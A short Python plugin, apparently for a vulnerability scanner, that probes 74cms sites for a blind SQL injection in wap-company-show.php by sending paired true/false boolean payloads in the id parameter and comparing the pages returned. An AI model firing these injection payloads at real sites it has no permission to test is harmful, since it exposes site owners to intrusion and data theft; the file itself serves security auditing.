#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#refer :http://www.wooyun.org/bugs/wooyun-2014-082539

def assign(service, arg):
    if service == "74cms":
        return True, arg

def audit(arg):
    true_url = arg + 'wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=52' #true
    false_url = arg + 'wap/wap-company-show.php?id=1%20and%20ascii(substring((md5(0x11)),1,1))=53' #false
    code1, head1, res1, errcode1,finalurl1 =  curl.curl(true_url)
    code2, head2, res2, errcode2,finalurl2 =  curl.curl(false_url)
    if code1 == 200 and code2 == 200:
        if res1.find('url="wap-jobs-show.php?id=1"') != -1 and res2.find('url="wap-jobs-show.php?id=1"') == -1:
            security_hole('find sql injection:' + true_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('74cms', 'http://127.0.0.1/74cms/')[1])